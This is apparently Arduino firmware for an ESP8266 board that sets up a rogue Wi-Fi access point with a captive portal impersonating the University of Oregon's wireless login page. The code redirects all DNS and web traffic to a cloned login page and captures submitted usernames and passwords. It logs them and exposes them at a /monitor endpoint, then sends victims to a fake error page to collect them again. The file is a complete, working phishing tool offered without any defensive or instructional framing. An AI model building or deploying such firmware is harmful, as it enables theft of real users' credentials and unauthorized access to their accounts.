#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <pgmspace.h>
#include "authpagecontent.h"
#define ICACHE_RODATA_ATTR  __attribute__((section(".irom.text")))
#define PROGMEM   ICACHE_RODATA_ATTR
//////////////////////
// WiFi Definitions //
//////////////////////
// this esp's ap credentials
const char AP_NAME[] = "ShogunOfWater";

int wifiStatus;
IPAddress ip(10,111,75,1);      // this node's soft ap ip address
IPAddress gateway(10,111,75,1); // this node's soft ap gateway
IPAddress subnet(255,255,254,0); // this node's soft ap subnet mask
ESP8266WebServer webServer(80);

const short DNS_PORT = 53;
DNSServer dnsServer;

/////////////////////
// Pin Definitions //
/////////////////////
const int LED_PIN = D4; // ESP's onboard, green LED
const int ANALOG_PIN = A0; // The only analog pin on the ESP
const int DIGITAL_PIN = D3; // Digital pin to be read

String ups = "";

void setup() 
{
  initHardware();
  Serial.setDebugOutput(true);
  setupWiFi();
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", ip);
  webServer.on("/", handle_redirect);
  webServer.on("/generate_204", handle_redirect);  //captive portal proc
  webServer.on("/success.txt", handle_redirect);  //Firefox captive portal
  webServer.on("/fs/customwebauth/uoauth.js", handle_uoauth); 
  webServer.on("/fs/customwebauth/webauth_functions.js", handle_webauth_functions); 
  webServer.on("/fs/customwebauth/jquery-1.7.2.min.js", handle_jquery); 
  webServer.on("/fs/customwebauth/style.css", handle_css);
  webServer.on("/fs/customwebauth/login.html", handle_login);
  webServer.on("/fs/customwebauth/error.html", handle_badauth);
  webServer.on("/login.html", handle_credentials);
  webServer.on("/monitor", handle_monitor);
  //webServer.on("/hotspot-detect.html", handle_login);  //Firefox captive portal
  //webServer.onNotFound(handle_not_found);
  webServer.onNotFound(handle_redirect);
  webServer.begin();
}

/** Is this an IP? */
boolean isIp(String str) {
  for (size_t i = 0; i < str.length(); i++) {
    int c = str.charAt(i);
    if (c != '.' && (c < '0' || c > '9')) {
      return false;
    }
  }
  return true;
}

/** IP to String? */
String toStringIp(IPAddress ip) {
  String res = "";
  for (int i = 0; i < 3; i++) {
    res += String((ip >> (8 * i)) & 0xFF) + ".";
  }
  res += String(((ip >> 8 * 3)) & 0xFF);
  return res;
}

void handle_redirect() {
    Serial.println("Request redirected to captive portal");
    webServer.sendHeader("Location", String("http://") + "wireless-auth.uoregon.edu/fs/customwebauth/login.html", true);
    webServer.send(302, "text/plain", "");   // Empty content inhibits Content-length header so we have to close the socket ourselves.
    webServer.client().stop(); // Stop is needed because we sent no content length
}

void handle_redirect_badauth() {
    Serial.println("Request redirected to credential reprompt");
    webServer.sendHeader("Location", String("http://") + "wireless-auth.uoregon.edu/fs/customwebauth/error.html", true);
    webServer.send(302, "text/plain", "");   // Empty content inhibits Content-length header so we have to close the socket ourselves.
    webServer.client().stop(); // Stop is needed because we sent no content length
}

void handle_login() {
    Serial.println("Recieved login request");
    webServer.sendHeader("Content-Type", "text/html");
    //webServer.sendContent_P(login_html);
    webServer.sendContent_P(login_html0);

    webServer.sendContent_P(uologo_png0);
    webServer.sendContent_P(uologo_png1);
    webServer.sendContent_P(uologo_png2);
    webServer.sendContent_P(uologo_png3);

    webServer.sendContent_P(login_html1);

    webServer.sendContent_P(masthead_png0);
    webServer.sendContent_P(masthead_png1);
    webServer.sendContent_P(masthead_png2);
    webServer.sendContent_P(masthead_png3);
    webServer.sendContent_P(masthead_png4);
    webServer.sendContent_P(masthead_png5);
    webServer.sendContent_P(masthead_png6);

    webServer.sendContent_P(login_html2);

    webServer.sendContent_P(login_png0);
    webServer.sendContent_P(login_png1);
    webServer.sendContent_P(login_png2);

    webServer.sendContent_P(login_html3);
}

void handle_monitor() {
    Serial.println("Refreshing Monitor: ");
    webServer.send(200, "text/html", ups);
}

void handle_badauth() {
    Serial.println("Recieved login request");
    webServer.sendHeader("Content-Type", "text/html");
    webServer.sendContent_P(error_html0);

    webServer.sendContent_P(uologo_png0);
    webServer.sendContent_P(uologo_png1);
    webServer.sendContent_P(uologo_png2);
    webServer.sendContent_P(uologo_png3);

    webServer.sendContent_P(error_html1);

    webServer.sendContent_P(masthead_png0);
    webServer.sendContent_P(masthead_png1);
    webServer.sendContent_P(masthead_png2);
    webServer.sendContent_P(masthead_png3);
    webServer.sendContent_P(masthead_png4);
    webServer.sendContent_P(masthead_png5);
    webServer.sendContent_P(masthead_png6);

    webServer.sendContent_P(error_html2);

}

void handle_credentials() {
    Serial.println("Recieved Credentials: ");
    String message = "<p>";
    ups += "<p>";
    if (webServer.hasArg("username")) {
        Serial.println(webServer.arg("username"));
        message += "Hello, " + String(webServer.arg("username")) + "</p><br><p>";
        ups += webServer.arg("username") + " : ";
    }
    if (webServer.hasArg("password")) {
        Serial.println(webServer.arg("password"));
        message += "Your password is " + String(webServer.arg("password")) + " and you are an idiot!";
        ups += webServer.arg("password");
    }
    ups += "<br></p>";
    message += "<br></p>";
    //webServer.send(200, "text/html", message);
    //handle_redirect();
    handle_redirect_badauth();
}

void handle_css() {
    Serial.println("Recieved css request");
    webServer.sendHeader("Content-Type", "text/css");
    webServer.sendContent_P(css);
}

void handle_uoauth() {
    Serial.println("Recieved uoauth request");
    webServer.send(200, "application/javascript", FPSTR(uoauth));
}

void handle_webauth_functions() {
    Serial.println("Recieved webauth functions request");
    webServer.send(200, "application/javascript", FPSTR(webauth_functions));
}

void handle_jquery() {
    Serial.println("Recieved jquery request");
    webServer.sendHeader("Content-Type", "application/javascript");
    webServer.sendContent_P(jqueryl0p0);
    webServer.sendContent_P(jqueryl0p1);
    webServer.sendContent_P(jqueryl0p2);
    webServer.sendContent_P(jqueryl0p3);
    webServer.sendContent_P(jqueryl0p4);
    webServer.sendContent_P(jqueryl0p5);
    webServer.sendContent_P(jqueryl0p6);
    webServer.sendContent_P(jqueryl0p7);
    webServer.sendContent_P(jqueryl0p8);
    webServer.sendContent_P(jqueryl0p9);
    webServer.sendContent_P(jqueryl0pA);
    webServer.sendContent_P(jqueryl0pB);
    webServer.sendContent_P(jqueryl0pC);
    webServer.sendContent_P(jqueryl0pD);
    webServer.sendContent_P(jqueryl1p0);
    webServer.sendContent_P(jqueryl1p1);
    webServer.sendContent_P(jqueryl1p2);
    webServer.sendContent_P(jqueryl1p3);
    webServer.sendContent_P(jqueryl1p4);
    webServer.sendContent_P(jqueryl1p5);
    webServer.sendContent_P(jqueryl1p6);
    webServer.sendContent_P(jqueryl1p7);
    webServer.sendContent_P(jqueryl1p8);
    webServer.sendContent_P(jqueryl1p9);
    webServer.sendContent_P(jqueryl1pA);
    webServer.sendContent_P(jqueryl1pB);
    webServer.sendContent_P(jqueryl1pC);
    webServer.sendContent_P(jqueryl1pD);
    webServer.sendContent_P(jqueryl2p0);
    webServer.sendContent_P(jqueryl2p1);
    webServer.sendContent_P(jqueryl2p2);
    webServer.sendContent_P(jqueryl2p3);
    webServer.sendContent_P(jqueryl2p4);
    webServer.sendContent_P(jqueryl2p5);
    webServer.sendContent_P(jqueryl2p6);
    webServer.sendContent_P(jqueryl2p7);
    webServer.sendContent_P(jqueryl2p8);
    webServer.sendContent_P(jqueryl2p9);
    webServer.sendContent_P(jqueryl2pA);
    webServer.sendContent_P(jqueryl2pB);
    webServer.sendContent_P(jqueryl2pC);
}

void handle_not_found() {
    String message = "\tURI not found\n\n";
    message += "URI: ";
    message += webServer.uri();
    webServer.send(200, "text/plain", message);
    Serial.println("Recieved not found");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void setupWiFi()
{
  Serial.print("This device's MAC address is: ");
  Serial.println(WiFi.softAPmacAddress());

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(ip, gateway, subnet);
  WiFi.softAP(AP_NAME);
  Serial.print("This AP's IP address is: ");
  Serial.println(WiFi.softAPIP());  
}

void initHardware()
{
  Serial.begin(115200);
  Serial.println();
  pinMode(DIGITAL_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT); 
  digitalWrite(LED_PIN, HIGH);//on Lolin ESP8266 v3 dev boards, the led is active low
  // Don't need to set ANALOG_PIN as input, 
  // that's all it can be.
}
